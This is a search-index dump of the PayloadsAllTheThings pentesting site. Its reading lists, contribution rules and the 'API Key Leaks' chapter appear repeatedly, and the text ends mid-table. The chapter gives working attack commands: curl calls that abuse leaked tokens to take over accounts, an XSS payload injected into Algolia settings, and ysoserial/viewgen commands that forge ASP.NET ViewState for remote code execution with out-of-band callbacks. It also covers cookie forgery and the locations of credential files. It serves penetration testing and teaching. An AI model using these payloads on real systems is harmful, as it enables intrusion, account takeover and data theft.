{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Payloads All The Things A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques ! I :heart: pull requests :) You can also contribute with a :beers: IRL, or using the sponsor button. \ud83d\udcd6 Documentation Every section contains the following files, you can use the _template_vuln folder to create a new chapter: README.md - vulnerability description and how to exploit it, including several payloads Intruder - a set of files to give to Burp Intruder Images - pictures for the README.md Files - some files referenced in the README.md You might also like the Methodology and Resources folder : Methodology and Resources Active Directory Attack.md Cloud - AWS Pentest.md Cloud - Azure Pentest.md Cobalt Strike - Cheatsheet.md Linux - Persistence.md Linux - Privilege Escalation.md Metasploit - Cheatsheet.md Methodology and enumeration.md Network Pivoting Techniques.md Network Discovery.md Reverse Shell Cheatsheet.md Subdomains Enumeration.md Windows - Download and Execute.md Windows - Mimikatz.md Windows - Persistence.md Windows - Post Exploitation Koadic.md Windows - Privilege Escalation.md Windows - Using credentials.md CVE Exploits You want more ? Check the Books and Youtube videos selections. \ud83d\udc68\u200d\ud83d\udcbb Contributions Be sure to read CONTRIBUTING.md Thanks again for your contribution! :heart:","title":"Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)"},{"location":"#payloads-all-the-things","text":"A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques ! I :heart: pull requests :) You can also contribute with a :beers: IRL, or using the sponsor button.","title":"Payloads All The Things"},{"location":"#documentation","text":"Every section contains the following files, you can use the _template_vuln folder to create a new chapter: README.md - vulnerability description and how to exploit it, including several payloads Intruder - a set of files to give to Burp Intruder Images - pictures for the README.md Files - some files referenced in the README.md You might also like the Methodology and Resources folder : Methodology and Resources Active Directory Attack.md Cloud - AWS Pentest.md Cloud - Azure Pentest.md Cobalt Strike - Cheatsheet.md Linux - Persistence.md Linux - Privilege Escalation.md Metasploit - Cheatsheet.md Methodology and enumeration.md Network Pivoting Techniques.md Network Discovery.md Reverse Shell Cheatsheet.md Subdomains Enumeration.md Windows - Download and Execute.md Windows - Mimikatz.md Windows - Persistence.md Windows - Post Exploitation Koadic.md Windows - Privilege Escalation.md Windows - Using credentials.md CVE Exploits You want more ? Check the Books and Youtube videos selections.","title":"\ud83d\udcd6 Documentation"},{"location":"#contributions","text":"Be sure to read CONTRIBUTING.md Thanks again for your contribution! :heart:","title":"\ud83d\udc68\u200d\ud83d\udcbb Contributions"},{"location":"BOOKS/","text":"Books Grab a book and relax. Some of the best books in the industry. Advanced Penetration Testing: Hacking the World's Most Secure Networks by Wil Allsopp (2017) Android Hacker's Handbook by Joshua J. Drake et al. (2014) Android Security Internals: An In-Depth Guide to Android's Security Architecture by Nikolay Elenkov (2015) Attacking Network Protocols: A Hacker's Guide to Capture, Analysis, and Exploitation by James Forshaw (2018) Black Hat Go: Go Programming for Hackers and Pentesters by Tom Steele, Chris Patten, and Dan Kottmann (2020) Black Hat Python: Python Programming for Hackers and Pentesters by Justin Seitz (2014) Breaking into Information Security: Learning the Ropes 101 - Andrew Gill Car Hacker's Handbook by Craig Smith (2016) Cyberjutsu: Cybersecurity for the Modern Ninja by Ben McCarty (2021) Foundations of Information Security: A Straightforward Introduction by Jason Andress (2019) Game Hacking: Developing Autonomous Bots for Online Games by Nick Cano (2016) Gray Hat Python: Python Programming for Hackers and Reverse Engineers by Justin Seitz (2009) Hacking: The Art of Exploitation by Jon Erickson (2004) iOS Hacker's Handbook by Charlie Miller et al. (2012) Metasploit: The Penetration Tester's Guide by David Kennedy (2011) OWASP Testing Guide: Stable Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman (2014) Pentesting Azure Applications: The Definitive Guide to Testing and Securing Deployments by Matt Burrough (2018) Practical Binary Analysis: Build Your Own Linux Tools for Binary instrumentation, Analysis, and Disassembly by Dennis Andriesse (2019) Practical Forensic Imaging: Securing Digital Evidence with Linux Tools by Bruce Nikkel (2016) Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things by Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou and Beau Woods (2021) Practical Doomsday: A User's Guide to the End of the World by Michal Zalewski (2022) Practical Social Engineering: A Primer for the Ethical Hacker by Joe Gray (2022) Real-World Bug Hunting: A Field Guide to Web Hacking by Peter Yaworski (2019) Rootkits and Bootkits: Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, and Sergey Bratus (2019) The Art of Cyberwarfare: An Investigator's Guide to Espionage, Ransomware, and Organized Cybercrime by Jon DiMaggio (2022) The Car Hacker's Handbook: A Guide for the Penetration Tester by Craig Smith (2016) The Browser Hacker's Handbook by Wade Alcorn et al. (2014) The Database Hacker's Handbook, David Litchfield et al. (2005) The Hacker Playbook: Practical Guide To Penetration Testing by Peter Kim (2014) The Hacker Playbook 2: Practical Guide to Penetration Testing by Peter Kim (2015) The Hacker Playbook 3: Practical Guide to Penetration Testing (Red Team Edition) by Peter Kim (2018) The Mac Hacker's Handbook by Charlie Miller & Dino Dai Zovi (2009) The Hardware Hacking Handbook by Jasper van Woudenberg & Colin O'Flynn (2022) The Mobile Application Hacker's Handbook by Dominic Chell et al. (2015) The Shellcoders Handbook by Chris Anley et al. (2007) The Web Application Hackers Handbook by D. Stuttard, M. Pinto (2011) Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers by T.J. O'Connor (2012) Web Hacking 101","title":"Books"},{"location":"BOOKS/#books","text":"Grab a book and relax. Some of the best books in the industry. Advanced Penetration Testing: Hacking the World's Most Secure Networks by Wil Allsopp (2017) Android Hacker's Handbook by Joshua J. Drake et al. (2014) Android Security Internals: An In-Depth Guide to Android's Security Architecture by Nikolay Elenkov (2015) Attacking Network Protocols: A Hacker's Guide to Capture, Analysis, and Exploitation by James Forshaw (2018) Black Hat Go: Go Programming for Hackers and Pentesters by Tom Steele, Chris Patten, and Dan Kottmann (2020) Black Hat Python: Python Programming for Hackers and Pentesters by Justin Seitz (2014) Breaking into Information Security: Learning the Ropes 101 - Andrew Gill Car Hacker's Handbook by Craig Smith (2016) Cyberjutsu: Cybersecurity for the Modern Ninja by Ben McCarty (2021) Foundations of Information Security: A Straightforward Introduction by Jason Andress (2019) Game Hacking: Developing Autonomous Bots for Online Games by Nick Cano (2016) Gray Hat Python: Python Programming for Hackers and Reverse Engineers by Justin Seitz (2009) Hacking: The Art of Exploitation by Jon Erickson (2004) iOS Hacker's Handbook by Charlie Miller et al. (2012) Metasploit: The Penetration Tester's Guide by David Kennedy (2011) OWASP Testing Guide: Stable Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman (2014) Pentesting Azure Applications: The Definitive Guide to Testing and Securing Deployments by Matt Burrough (2018) Practical Binary Analysis: Build Your Own Linux Tools for Binary instrumentation, Analysis, and Disassembly by Dennis Andriesse (2019) Practical Forensic Imaging: Securing Digital Evidence with Linux Tools by Bruce Nikkel (2016) Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things by Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou and Beau Woods (2021) Practical Doomsday: A User's Guide to the End of the World by Michal Zalewski (2022) Practical Social Engineering: A Primer for the Ethical Hacker by Joe Gray (2022) Real-World Bug Hunting: A Field Guide to Web Hacking by Peter Yaworski (2019) Rootkits and Bootkits: Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, and Sergey Bratus (2019) The Art of Cyberwarfare: An Investigator's Guide to Espionage, Ransomware, and Organized Cybercrime by Jon DiMaggio (2022) The Car Hacker's Handbook: A Guide for the Penetration Tester by Craig Smith (2016) The Browser Hacker's Handbook by Wade Alcorn et al. (2014) The Database Hacker's Handbook, David Litchfield et al. (2005) The Hacker Playbook: Practical Guide To Penetration Testing by Peter Kim (2014) The Hacker Playbook 2: Practical Guide to Penetration Testing by Peter Kim (2015) The Hacker Playbook 3: Practical Guide to Penetration Testing (Red Team Edition) by Peter Kim (2018) The Mac Hacker's Handbook by Charlie Miller & Dino Dai Zovi (2009) The Hardware Hacking Handbook by Jasper van Woudenberg & Colin O'Flynn (2022) The Mobile Application Hacker's Handbook by Dominic Chell et al. (2015) The Shellcoders Handbook by Chris Anley et al. (2007) The Web Application Hackers Handbook by D. Stuttard, M. Pinto (2011) Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers by T.J. O'Connor (2012) Web Hacking 101","title":"Books"},{"location":"CONTRIBUTING/","text":"CONTRIBUTING PayloadsAllTheThings' Team :heart: pull requests :) Feel free to improve with your payloads and techniques ! You can also contribute with a :beers: IRL, or using the sponsor button. Pull Requests Guidelines In order to provide the safest payloads for the community, the following rules must be followed for every Pull Request. Payloads must be sanitized Use id , and whoami , for RCE Proof of Concepts Use [REDACTED] when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc. Use 10.10.10.10 and 10.10.10.11 when the payload require IP addresses Use Administrator for privileged users and User for normal account Use P@ssw0rd , Password123 , password as default passwords for your examples Prefer commonly used name for machines such as DC01 , EXCHANGE01 , WORKSTATION01 , etc References must have an author , a title and a link . The date is not mandatory but appreciated :) Techniques Folder Every section should contains the following files, you can use the _template_vuln folder to create a new technique folder: README.md - vulnerability description and how to exploit it, including several payloads, more below Intruder - a set of files to give to Burp Intruder Images - pictures for the README.md Files - some files referenced in the README.md README.md format Use the following example to create a new technique README.md file. # Vulnerability Title > Vulnerability description ## Summary * [Tools](#tools) * [Something](#something) * [Subentry 1](#sub1) * [Subentry 2](#sub2) * [References](#references) ## Tools - [Tool 1](https://example.com) - [Tool 2](https://example.com) ## Something Quick explanation ### Subentry 1 Something about the subentry 1 ## References - [Blog title - Author, Date](https://example.com)","title":"CONTRIBUTING"},{"location":"CONTRIBUTING/#contributing","text":"PayloadsAllTheThings' Team :heart: pull requests :) Feel free to improve with your payloads and techniques ! You can also contribute with a :beers: IRL, or using the sponsor button.","title":"CONTRIBUTING"},{"location":"CONTRIBUTING/#pull-requests-guidelines","text":"In order to provide the safest payloads for the community, the following rules must be followed for every Pull Request. Payloads must be sanitized Use id , and whoami , for RCE Proof of Concepts Use [REDACTED] when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc. Use 10.10.10.10 and 10.10.10.11 when the payload require IP addresses Use Administrator for privileged users and User for normal account Use P@ssw0rd , Password123 , password as default passwords for your examples Prefer commonly used name for machines such as DC01 , EXCHANGE01 , WORKSTATION01 , etc References must have an author , a title and a link . The date is not mandatory but appreciated :)","title":"Pull Requests Guidelines"},{"location":"CONTRIBUTING/#techniques-folder","text":"Every section should contains the following files, you can use the _template_vuln folder to create a new technique folder: README.md - vulnerability description and how to exploit it, including several payloads, more below Intruder - a set of files to give to Burp Intruder Images - pictures for the README.md Files - some files referenced in the README.md","title":"Techniques Folder"},{"location":"CONTRIBUTING/#readmemd-format","text":"Use the following example to create a new technique README.md file. # Vulnerability Title > Vulnerability description ## Summary * [Tools](#tools) * [Something](#something) * [Subentry 1](#sub1) * [Subentry 2](#sub2) * [References](#references) ## Tools - [Tool 1](https://example.com) - [Tool 2](https://example.com) ## Something Quick explanation ### Subentry 1 Something about the subentry 1 ## References - [Blog title - Author, Date](https://example.com)","title":"README.md format"},{"location":"TWITTER/","text":"Twitter Twitter is very common in the InfoSec area. Many advices and tips on bug hunting or CTF games are posted every day. It is worth following the feeds of some successful security researchers and hackers. Accounts @St\u00f6k - Bug bounty hunter, cybersecurity educational content creator @NahamSec - Hacker & content creator & co-founder bugbountyforum and http://recon.dev @dawgyg - Bug bounty hunter, reformed blackhat, Synack red team member @putsi - Bug bounty hunter and white hat hacker in Team ROT @thecybermentor - Offers cybersecurity and hacking courses @InsiderPhD - PhD student, occasional bug bounty hunter & educational cyber security youtuber @LiveOverflow - Content creator and hacker producing videos on various IT security topics and participating in hacking contests @EdOverflow - Web developer, security researcher and triager for numerous vulnerability disclosure programs @r0bre - Bug Hunter for web- and systemsecurity, iOS Security researcher @intigriti - European ethical hacking & bug bounty platform @Hacker0x01 - American bug bounty platform @bugcrowd - Another american bug bounty platform @hakluke - Bug bounty hunter, content creator, creator of some great pentesting tools like hakrawler @spaceraccoon - Security researcher and white hat hacker. Has worked on several bug bounty programs @samwcyo - Full time bug bounty hunter @Th3G3nt3lman - Security Reasearch & Bug bounty hunter @securinti - Dutch bug bounty hunter & head of hackers and bord member @ intigriti @jobertabma - Co-founder of HackerOne, security researcher @codingo_ - Global Head of Security Ops and Researcher Enablement bugcrowd, Maintainer of some great pentesting tools like NoSQLMap or VHostScan @TomNomNom - security researcher, maintainer of many very useful pentesting tools @orange_8361 - bug bounty hunter and security researcher, specialized on RCE bugs @d0nutptr - part-time bug hunter, Lead Security Engineer at graplsec @filedescriptor - security researcher, bug hunter and content creator at 0xReconless @0xReconless - Security research, blogs, and videos by filedescriptor, ngalongc & EdOverflow @pentest_swissky - Author of PayloadsAllTheThings & SSRFmap @GentilKiwi - Author of Mimikatz & Kekeo","title":"Twitter"},{"location":"TWITTER/#twitter","text":"Twitter is very common in the InfoSec area. Many advices and tips on bug hunting or CTF games are posted every day. It is worth following the feeds of some successful security researchers and hackers.","title":"Twitter"},{"location":"TWITTER/#accounts","text":"@St\u00f6k - Bug bounty hunter, cybersecurity educational content creator @NahamSec - Hacker & content creator & co-founder bugbountyforum and http://recon.dev @dawgyg - Bug bounty hunter, reformed blackhat, Synack red team member @putsi - Bug bounty hunter and white hat hacker in Team ROT @thecybermentor - Offers cybersecurity and hacking courses @InsiderPhD - PhD student, occasional bug bounty hunter & educational cyber security youtuber @LiveOverflow - Content creator and hacker producing videos on various IT security topics and participating in hacking contests @EdOverflow - Web developer, security researcher and triager for numerous vulnerability disclosure programs @r0bre - Bug Hunter for web- and systemsecurity, iOS Security researcher @intigriti - European ethical hacking & bug bounty platform @Hacker0x01 - American bug bounty platform @bugcrowd - Another american bug bounty platform @hakluke - Bug bounty hunter, content creator, creator of some great pentesting tools like hakrawler @spaceraccoon - Security researcher and white hat hacker. Has worked on several bug bounty programs @samwcyo - Full time bug bounty hunter @Th3G3nt3lman - Security Reasearch & Bug bounty hunter @securinti - Dutch bug bounty hunter & head of hackers and bord member @ intigriti @jobertabma - Co-founder of HackerOne, security researcher @codingo_ - Global Head of Security Ops and Researcher Enablement bugcrowd, Maintainer of some great pentesting tools like NoSQLMap or VHostScan @TomNomNom - security researcher, maintainer of many very useful pentesting tools @orange_8361 - bug bounty hunter and security researcher, specialized on RCE bugs @d0nutptr - part-time bug hunter, Lead Security Engineer at graplsec @filedescriptor - security researcher, bug hunter and content creator at 0xReconless @0xReconless - Security research, blogs, and videos by filedescriptor, ngalongc & EdOverflow @pentest_swissky - Author of PayloadsAllTheThings & SSRFmap @GentilKiwi - Author of Mimikatz & Kekeo","title":"Accounts"},{"location":"YOUTUBE/","text":"Youtube Channels IppSec Channel - Hack The Box Writeups LiveOverflow - Explore weird machines... GynvaelEN - Podcasts about CTFs, computer security, programing and similar things. John Hammond - Wargames and CTF writeups Murmus CTF - Weekly live streamings PwnFunction OJ Reeves Hacksplained - A Beginner Friendly Guide to Hacking ST\u00d6K Defcon Hackersploit The Cyber Mentor Nahamsec Hackerone The Hated one stacksmashing / Ghidra Ninja Hak5 Conferences Hunting for Top Bounties - Nicolas Gr\u00e9goire BSidesSF 101 The Tales of a Bug Bounty Hunter - Arne Swinnen Security Fest 2016 The Secret life of a Bug Bounty Hunter - Frans Ros\u00e9n The Conscience of a Hacker Defcon 2020 Talks","title":"Youtube"},{"location":"YOUTUBE/#youtube","text":"","title":"Youtube"},{"location":"YOUTUBE/#channels","text":"IppSec Channel - Hack The Box Writeups LiveOverflow - Explore weird machines... GynvaelEN - Podcasts about CTFs, computer security, programing and similar things. John Hammond - Wargames and CTF writeups Murmus CTF - Weekly live streamings PwnFunction OJ Reeves Hacksplained - A Beginner Friendly Guide to Hacking ST\u00d6K Defcon Hackersploit The Cyber Mentor Nahamsec Hackerone The Hated one stacksmashing / Ghidra Ninja Hak5","title":"Channels"},{"location":"YOUTUBE/#conferences","text":"Hunting for Top Bounties - Nicolas Gr\u00e9goire BSidesSF 101 The Tales of a Bug Bounty Hunter - Arne Swinnen Security Fest 2016 The Secret life of a Bug Bounty Hunter - Frans Ros\u00e9n The Conscience of a Hacker Defcon 2020 Talks","title":"Conferences"},{"location":"API%20Key%20Leaks/","text":"API Key Leaks The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares. Summary Tools Exploit Google Maps Algolia AWS Access Key ID & Secret Slack API Token Facebook Access Token Github client id and client secret Twilio Account_sid and Auth Token Twitter API Secret Twitter Bearer Token Gitlab Personal Access Token HockeyApp API Token IIS Machine Keys Mapbox API Token Tools KeyFinder - is a tool that let you find keys while surfing the web! Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid. truffleHog - Find credentials all over the place ps1 docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity trufflehog git https://github.com/trufflesecurity/trufflehog.git trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2 Exploit The following commands can be used to takeover accounts or extract personal information from the API using the leaked token. Google Maps Use : https://github.com/ozguralp/gmapsapiscanner/ Usage: | Name | Endpoint | | --- | --- | | Static Maps | https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE | | Streetview | https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE | | Embed | https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE | | Directions | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE | | Geocoding | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE | | Distance Matrix | https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE | | Find Place from Text | https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE | | Autocomplete | https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE | | Elevation | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE | | Timezone | https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE | | Roads | https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE | | Geolocate | https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE | Impact: * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company * Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account Algolia curl --request PUT \\ --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \\ --header 'content-type: application/json' \\ --header 'x-algolia-api-key: <example-key>' \\ --header 'x-algolia-application-id: <example-application-id>' \\ --data '{\"highlightPreTag\": \"<script>alert(1);</script>\"}' Slack API Token curl -sX POST \"https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1\" Facebook Access Token curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2 Github client id and client secret curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy' Twilio Account_sid and Auth token curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN Twitter API Secret curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token' Twitter Bearer Token curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN' Gitlab Personal Access Token curl \"https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>\" HockeyApp API Token curl -H \"X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c\" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4 IIS Machine Keys That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification. Requirements * machineKey validationKey and decryptionKey * __VIEWSTATEGENERATOR cookies * __VIEWSTATE cookies Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication. <machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" /> Common locations of web.config / machine.config * 32-bit * C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config * C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config * 64-bit * C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config * C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config * in registry when AutoGenerate is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4 * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey Identify known machine key Exploit with Blacklist3r/AspDotNetWrapper Exploit with ViewGen # --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file # -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value $ viewgen --guess \"/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\" [+] ViewState is not encrypted [+] Signature algorithm: SHA1 # --encrypteddata : __VIEWSTATE parameter value of the target application # --modifier : __VIEWSTATEGENERATOR parameter value $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> \u2013macdecode Decode ViewState $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\" $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=CA0B0334 --macdecode $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath \"/Savings-and-Investments/Application/ContactDetails.aspx\" -f out.txt --IISDirPath=\"/\" Generate ViewState for RCE NOTE : Send a POST request with the generated ViewState to the same endpoint, in Burp you should URL Encode Key Characters for your payload. $ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd.exe /c nslookup <your collab domain>\" --decryptionalg=\"AES\" --generator=ABABABAB decryptionkey=\"<decryption key>\" --validationalg=\"SHA1\" --validationkey=\"<validation key>\" $ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"echo 123 > c:\\pwn.txt\" --generator=\"CA0B0334\" --validationalg=\"MD5\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\" $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \"C:\\Users\\zhu\\Desktop\\ExploitClass.cs;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Web.dll\" --generator=\"CA0B0334\" --validationalg=\"SHA1\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\" $ viewgen --webconfig web.config -m CA0B0334 -c \"ping yourdomain.tld\" Edit cookies with the machine key If you have the machineKey but the viewstate is disabled. ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools # decrypt cookie $ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes # encrypt cookie (edit Decrypted.txt) $ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt Mapbox API Token A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is sk , jackpot. If it's pk or tk , it's not worth your time. #Check token validity curl \"https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN\" #Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope) curl \"https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN\" References Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019 Private API key leakage due to lack of access control - yox - August 8, 2018 Project Blacklist3r - November 23, 2018 - @notsosecure Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020 Mapbox API Token Documentation","title":"API Key Leaks"},{"location":"API%20Key%20Leaks/#api-key-leaks","text":"The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.","title":"API Key Leaks"},{"location":"API%20Key%20Leaks/#summary","text":"Tools Exploit Google Maps Algolia AWS Access Key ID & Secret Slack API Token Facebook Access Token Github client id and client secret Twilio Account_sid and Auth Token Twitter API Secret Twitter Bearer Token Gitlab Personal Access Token HockeyApp API Token IIS Machine Keys Mapbox API Token","title":"Summary"},{"location":"API%20Key%20Leaks/#tools","text":"KeyFinder - is a tool that let you find keys while surfing the web! Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid. truffleHog - Find credentials all over the place ps1 docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity trufflehog git https://github.com/trufflesecurity/trufflehog.git trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2","title":"Tools"},{"location":"API%20Key%20Leaks/#exploit","text":"The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.","title":"Exploit"},{"location":"API%20Key%20Leaks/#google-maps","text":"Use : https://github.com/ozguralp/gmapsapiscanner/ Usage: | Name | Endpoint | | --- | --- | | Static Maps | https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE | | Streetview | https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE | | Embed | https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE | | Directions | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE | | Geocoding | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE | | Distance Matrix | https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE | | Find Place from Text | https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE | | Autocomplete | https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE | | Elevation | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE | | Timezone | 